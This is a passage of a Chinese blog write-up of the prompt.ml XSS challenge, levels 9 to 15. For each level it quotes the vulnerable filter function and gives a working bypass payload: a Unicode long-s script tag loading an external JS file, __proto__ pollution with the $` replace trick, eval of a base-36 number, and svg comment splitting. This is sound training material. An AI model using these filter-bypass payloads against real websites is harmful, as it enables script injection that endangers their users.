+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">toUpperCase</span><span class="hljs-params">()</span></span>:<br>ı  ==&gt;I<br>ſ  ==&gt;S<br><br><span class="hljs-function"><span class="hljs-title">toLowerCase</span><span class="hljs-params">()</span></span>:<br>İ  ==&gt;i<br>K  ==&gt;k<br></code></pre></td></tr></table></figure>
+<p>因此可以构造<code>payload</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;ſcript src=<span class="hljs-comment">//test.mengsec.com/1.js&gt;&lt;/ſcript&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190603221506.png" srcset="/img/loading.gif"></p>
+<h3 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// (╯°□°）╯︵ ┻━┻</span><br>    input = <span class="hljs-built_in">encodeURIComponent</span>(input).replace(<span class="hljs-regexp">/prompt/g</span>, <span class="hljs-string">&#x27;alert&#x27;</span>);<br>    <span class="hljs-comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span><br>    input = input.replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/script&gt; &#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure>
+<p>这个题倒是蛮简单的，将输入的<code>prompt</code>替换成了<code>alert</code>，然后将单引号替换为空了。<br>直接构造<code>payload</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pro<span class="hljs-string">&#x27;mpt(1)</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190603221900.png" srcset="/img/loading.gif"></p>
+<h3 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// name should not contain special characters</span><br>    <span class="hljs-keyword">var</span> memberName = input.replace(<span class="hljs-regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// data to be parsed as JSON</span><br>    <span class="hljs-keyword">var</span> dataString = <span class="hljs-string">&#x27;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#x27;</span> + memberName + <span class="hljs-string">&#x27;.&quot;&#125;&#x27;</span>;<br><br>    <span class="hljs-comment">// directly &quot;parse&quot; data in script context</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;                                \n\</span><br><span class="hljs-string">&lt;script&gt;                                    \n\</span><br><span class="hljs-string">    var data = &#x27;</span> + dataString + <span class="hljs-string">&#x27;;          \n\</span><br><span class="hljs-string">    if (data.action === &quot;login&quot;)            \n\</span><br><span class="hljs-string">        document.write(data.message)        \n\</span><br><span class="hljs-string">&lt;/script&gt; &#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure>
+<p>在这里使用了in运算符</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;(prompt(1))in&quot;</span><br></code></pre></td></tr></table></figure>
+<p>通过前后的双引号来闭合字符串，借助<code>in</code>运算符来执行<code>js</code>代码。<br>虽然有报错，但是代码还是成功执行了</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Uncaught TypeError: <span class="hljs-string">&quot;Welcome back, &quot;</span> <span class="hljs-literal">is</span><span class="hljs-built_in"> not</span> a <span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190603223549.png" srcset="/img/loading.gif"></p>
+<h3 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// in Soviet Russia...</span><br>    input = <span class="hljs-built_in">encodeURIComponent</span>(input).replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// table flips you!</span><br>    input = input.replace(<span class="hljs-regexp">/prompt/g</span>, <span class="hljs-string">&#x27;alert&#x27;</span>);<br><br>    <span class="hljs-comment">// ノ┬─┬ノ ︵ ( \o°o)\</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/script&gt; &#x27;</span>;<br>&#125;     <br></code></pre></td></tr></table></figure>
+<p>代码很明确，先过滤了单引号，又将<code>prompt</code>替换成了<code>alert</code>，在这里用到了一个小<code>trick</code>，借助<code>parseInt</code>方法，将字符串<code>prompt</code>作为<code>36</code>进制转换为数字，然后通过<code>eval</code>来执行<code>toString</code>来绕过代码中对<code>prompt</code>的过滤。</p>
+<p>可得<code>payload</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">parseInt</span>(<span class="hljs-string">&quot;prompt&quot;</span>,<span class="hljs-number">36</span>) ==&gt; <span class="hljs-number">1558153217</span><br><span class="hljs-built_in">eval</span>((<span class="hljs-number">1558153217</span>).toString(<span class="hljs-number">36</span>))(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604081234.png" srcset="/img/loading.gif"></p>
+<h3 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// extend method from Underscore library</span><br>    <span class="hljs-comment">// _.extend(destination, *sources) </span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">extend</span>(<span class="hljs-params">obj</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> source, prop;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>, length = <span class="hljs-built_in">arguments</span>.length; i &lt; length; i++) &#123;<br>            source = <span class="hljs-built_in">arguments</span>[i];<br>            <span class="hljs-keyword">for</span> (prop <span class="hljs-keyword">in</span> source) &#123;<br>                obj[prop] = source[prop];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-comment">// a simple picture plugin</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;</span><br>        <span class="hljs-keyword">var</span> data = <span class="hljs-built_in">JSON</span>.parse(input);<br>        <span class="hljs-keyword">var</span> config = extend(&#123;<br>            <span class="hljs-comment">// default image source</span><br>            source: <span class="hljs-string">&#x27;http://placehold.it/350x150&#x27;</span><br>        &#125;, <span class="hljs-built_in">JSON</span>.parse(input));<br>        <span class="hljs-comment">// forbit invalid image source</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;<br>            <span class="hljs-keyword">delete</span> config.source;<br>        &#125;<br>        <span class="hljs-comment">// purify the source by stripping off &quot;</span><br>        <span class="hljs-keyword">var</span> source = config.source.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-comment">// insert the content using mustache-ish template</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#x27;</span>.replace(<span class="hljs-string">&#x27;&#123;&#123;source&#125;&#125;&#x27;</span>, source);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid image data.&#x27;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+<p>简单分析一下代码，输入的需要是一个<code>json</code>字符串，在该<code>json</code>中，需要有一个键为<code>source</code>的键值对，而且它的值中只能有大小写字母数字和特殊符号<code>./:</code>，否则会被删除。然后将<code>source</code>的值替换<code>img</code>标签中的<code>&#123;&#123;source&#125;&#125;</code>，然后过滤掉双引号。</p>
+<p>在这里用到了<code>JavaScript</code>的<code>__proto__</code>，它是对象的一个属性，用来标识对象本身所继承的原型。<br>当某个对象的属性无法找到时，<code>JavaScript</code>会从它的<code>__proto__</code>属性指向的原型中寻找该属性。<br>当我们输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;不符合正则的字符串&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;exp&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604101530.png" srcset="/img/loading.gif"></p>
+<p>这样就成功绕过了正则的检测，但是后面还对双引号进行了过滤，这里用到了另一个<code>trick</code>。<br>看手册</p>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604102133.png" srcset="/img/loading.gif"></p>
+<p>测试一下</p>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604102847.png" srcset="/img/loading.gif"></p>
+<p>因此，我们可以利用<code>$\\</code>来传入一个<code>&quot;</code>，从而闭合标签。<br>构造Payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;!!&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;source&quot;</span>:<span class="hljs-string">&quot;$`onerror=prompt(1)&gt;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604103333.png" srcset="/img/loading.gif"></p>
+<p>成功执行代码。</p>
+<h3 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// I expect this one will have other solutions, so be creative :)</span><br>    <span class="hljs-comment">// mspaint makes all file names in all-caps :(</span><br>    <span class="hljs-comment">// too lazy to convert them back in lower case</span><br>    <span class="hljs-comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span><br>    input = input.toUpperCase();<br>    <span class="hljs-comment">// only allows images loaded from own host or data URI scheme</span><br>    input = input.replace(<span class="hljs-regexp">/\/\/|\w+:/g</span>, <span class="hljs-string">&#x27;data:&#x27;</span>);<br>    <span class="hljs-comment">// miscellaneous filtering</span><br>    input = input.replace(<span class="hljs-regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;<br>&#125;  <br></code></pre></td></tr></table></figure>
+<p>首先将输入使用方法<code>toUpperCase()</code>进行了处理，然后通过正则限定了协议为<code>data:</code>，在后面又过滤了多个特殊符号，将其替换为了<code>_</code></p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">\ <span class="hljs-meta">&amp; + % 空白符 换行符等</span><br></code></pre></td></tr></table></figure>
+<p>直接就想到了<code>base64</code>编码，但是<code>toUpperCase()</code>将所有的字母变成了大写，不太好办。<br>看wp是直接构造了一个<code>base64</code>编码后全部为大写的<code>payload</code>，没整出来。</p>
+<h3 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// sort of spoiler of level 7</span><br>    input = input.replace(<span class="hljs-regexp">/\*/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    <span class="hljs-comment">// pass in something like dog#cat#bird#mouse...</span><br>    <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> segments.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">title, index</span>) </span>&#123;<br>        <span class="hljs-comment">// title can only contain 15 characters</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>) + <span class="hljs-string">&#x27;&quot; data-comment=\&#x27;&#123;&quot;id&quot;:&#x27;</span> + index + <span class="hljs-string">&#x27;&#125;\&#x27;&gt;&lt;/p&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>说是level 7的升级版，结合<code>svg</code>标签和注释符<code>&lt;!-- --&gt;</code><br>构造<code>Payload</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(&lt;!--#--&gt;1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190604145802.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                      <a class="hover-with-bg" href="/tags/XSS/">XSS</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/06/14/alert1-to-win/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XSS靶场练习（二）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/04/Python3-advanced-feature-learning/">
+                        <span class="hidden-mobile">Python3 高级特性学习——协程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
